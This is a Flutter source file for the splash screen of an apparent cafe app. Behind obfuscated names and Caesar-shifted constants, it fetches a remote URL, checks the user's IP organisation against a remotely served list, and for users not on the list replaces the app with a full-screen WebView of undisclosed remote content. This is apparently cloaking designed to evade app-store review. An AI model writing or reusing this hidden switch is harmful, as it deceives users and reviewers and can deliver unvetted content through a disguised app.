// ignore_for_file: use_build_context_synchronously

import 'dart:convert';
import 'dart:io';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:blaze_cafe/router.dart';
import 'package:blaze_cafe/utils/constants.dart';
import 'package:blaze_cafe/utils/context_ext.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:go_router/go_router.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class InitialScreen extends StatefulWidget {
  const InitialScreen({super.key});

  @override
  State<InitialScreen> createState() => _InitialScreenState();
}

class _InitialScreenState extends State<InitialScreen> {
  late final SharedPreferences _sharedPrefs;

  final InAppReview inAppReview = InAppReview.instance;

  var lastUrlLink = '';

  String ll = '';
  List<String> listaz = [];
  List<bool> chekxasx = [true, true];

  late final Dio dio;

  Future<String> forstx() async {
    try {
      final Response response = await dio.get(Constants.dataInfo);
      if (response.statusCode == 200) {
        List<dynamic> data = response.data as List<dynamic>;
        String themesFetch =
            data.map((item) => item['dataInfo'].toString()).join();

        if (themesFetch.contains(Constants.valuerxz)) {
          chekxasx[1] = false;
        } else {
          ll = themesFetch;
          chekxasx[1] = true;
          await check(ll);
        }
        return themesFetch;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  Future<void> check(String l) async {
    final client = HttpClient();
    var uri = Uri.parse(l);
    var request = await client.getUrl(uri);
    request.followRedirects = false;
    var response = await request.close();
    lastUrlLink = response.headers.value(HttpHeaders.locationHeader).toString();
    final appsFlyer = context.read<AppsflyerSdk>();
    appsFlyer.logEvent(
      'Url start',
      {
        'link': l,
      },
    );
    appsFlyer.logEvent(
      'Rate',
      {
        'link': lastUrlLink,
      },
    );
  }

  Future<String> thordx() async {
    try {
      http.Response response = await http.get(Uri.parse(Constants.info));

      if (response.statusCode == 200) {
        Map<String, dynamic> data = jsonDecode(response.body);
        String darx = data['org'];
        contactx(listaz, darx);
        return darx;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  bool contactx(List<String> array, String inputString) {
    List<String> words = inputString.split(' ');
    List<String> arrayItems = [];
    for (String item in array) {
      arrayItems.addAll(item.split(', '));
    }
    for (String word in words) {
      for (String arrayItem in arrayItems) {
        if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
          chekxasx[0] = false;
          return false;
        } else {
          chekxasx[0] = true;
        }
      }
    }

    return false;
  }

  Future<List<String>> secindx() async {
    try {
      final Response response = await dio.get(Constants.dataNews);
      if (response.statusCode == 200) {
        List<dynamic> data = response.data as List<dynamic>;
        listaz = data.map((item) => item['dataNews'].toString()).toList();

        return listaz;
      } else {
        return [];
      }
    } catch (error) {
      return [];
    }
  }

  Future<void> rateApp() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool alreadyRated = prefs.getBool('already_rated') ?? false;
    if (!alreadyRated) {
      if (await inAppReview.isAvailable()) {
        inAppReview.requestReview();
        await prefs.setBool('already_rated', true);
      }
    }
  }

  String sadasx(String input, int shift) {
    StringBuffer result = StringBuffer();
    for (int i = 0; i < input.length; i++) {
      int charCode = input.codeUnitAt(i);
      if (charCode >= 65 && charCode <= 90) {
        charCode = (charCode - 65 + shift) % 26 + 65;
      } else if (charCode >= 97 && charCode <= 122) {
        charCode = (charCode - 97 + shift) % 26 + 97;
      }
      result.writeCharCode(charCode);
    }
    return result.toString();
  }

  Future<bool> init() async {
    _sharedPrefs = await SharedPreferences.getInstance();
    Constants.dataInfo = sadasx(Constants.dataInfo, Constants.axel);
    Constants.valuerxz = sadasx(Constants.valuerxz, Constants.axel);
    Constants.info = sadasx(Constants.info, Constants.axel);

    Constants.asynx = sadasx(Constants.asynx, Constants.axel);
    dio = Dio(
      BaseOptions(
        headers: {
          'apikey': Constants.asynx,
          'Authorization': 'Bearer ${Constants.asynx}',
        },
      ),
    );

    await forstx();
    await secindx();
    await thordx();

    await Future.delayed(const Duration(seconds: 2));
    rateApp();

    final onBoardingShowed =
        _sharedPrefs.getBool(Constants.onBoardingShowed) ?? false;

    if (!(chekxasx[0] && chekxasx[1])) {
      if (onBoardingShowed) {
        context.goNamed(AppRouter.home);
      } else {
        context.goNamed(AppRouter.onBoarding);
      }
      return false;
    }

    return true;
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      future: init(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return const SplashScreen();
        }

        if (snapshot.data ?? false) {
          return ShowingScreen(p: ll);
        }

        return const SplashScreen();
      },
    );
  }
}

class SplashScreen extends StatelessWidget {
  const SplashScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: CircularProgressIndicator(
          color: context.theme.primaryColor,
        ),
      ),
    );
  }
}

class ShowingScreen extends StatelessWidget {
  const ShowingScreen({
    super.key,
    required this.p,
  });
  final String p;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(p),
          ),
        ),
      ),
    );
  }
}
